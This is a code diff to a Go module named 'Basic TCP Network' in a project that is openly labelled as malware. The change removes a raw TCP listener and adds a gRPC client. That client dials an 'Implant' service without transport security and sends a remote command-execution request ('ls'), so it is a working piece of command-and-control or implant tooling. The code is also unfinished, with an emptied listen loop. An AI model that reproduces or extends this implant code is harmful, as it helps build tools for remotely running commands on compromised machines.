@@ -1,11 +1,15 @@
 package basic_tcp_network
 
 import (
+	"context"
 	"fmt"
+	"log"
 	"malware/common"
 	"malware/common/types"
-	"net"
 	"strings"
+	"time"
+
+	pb "malware/common/messages"
 
 	"google.golang.org/grpc"
 )
@@ -23,44 +27,17 @@ func SendText(args []string) types.Event {
 type state struct {
 	running      bool
 	eventChannel chan types.Event
-	listener     net.Listener
 	grpc         *grpc.Server
 }
 
 type settings struct {
 	state *state
+	ip    string
 	port  int16
-}
-
-func (settings settings) createServer() {
-	host := fmt.Sprintf(":%d", settings.port)
-	listener, err := net.Listen("tcp", host)
-
-	if err != nil {
-		common.Panicf(err, "Hosting on %s failed", host)
-	}
-
-	server := grpc.NewServer()
-	settings.state.listener = listener
-	settings.state.grpc = server
-
-	pb.Register
-
-	fmt.Println("Listening on ", server.GetServiceInfo())
 }
 
 func (settings settings) listenServer() {
 	for settings.state.running {
-		conn, err := settings.state.listener.Accept()
-		if err != nil {
-			common.Panicf(err, "Received message can't read %V", conn)
-		}
-		// TODO: deserialize message
-		buffer := make([]byte, 1024)
-		for n, err := conn.Read(buffer); err == nil; {
-			fmt.Println(n, ":", string(buffer))
-		}
-		conn.Close()
 	}
 }
 
@@ -87,17 +64,32 @@ func (settings settings) runEvents() {
 }
 
 func Create() types.Module {
-	port := int16(8080)
+	port := int16(2000)
+	ip := "127.0.0.1"
 	state := state{eventChannel: nil}
 
-	return settings{&state, port}
+	return settings{&state, ip, port}
+}
+
+func (settings settings) testConnection() {
+	host := fmt.Sprintf("%s:%d", settings.ip, settings.port)
+
+	conn, err := grpc.Dial(host, grpc.WithInsecure())
+
+	if err != nil {
+		log.Fatalf("fail to dial: %v", err)
+	}
+	defer conn.Close()
+	client := pb.NewImplantClient(conn)
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+	fmt.Println(client.Exec(ctx, &pb.ExecRequest{Cmd: "ls"}))
 }
 
 func (settings settings) Init() chan types.Event {
 	settings.state.eventChannel = make(chan types.Event, 1)
 	settings.state.running = true
-	settings.createServer()
-
+	settings.testConnection()
 	go settings.listenServer()
 	go settings.runEvents()
 
@@ -106,7 +98,6 @@ func (settings settings) Init() chan types.Event {
 
 func (settings settings) Shutdown() {
 	settings.state.running = false
-	settings.state.listener.Close()
 }
 
 func (settings) ID() string { return "Basic TCP Network" }
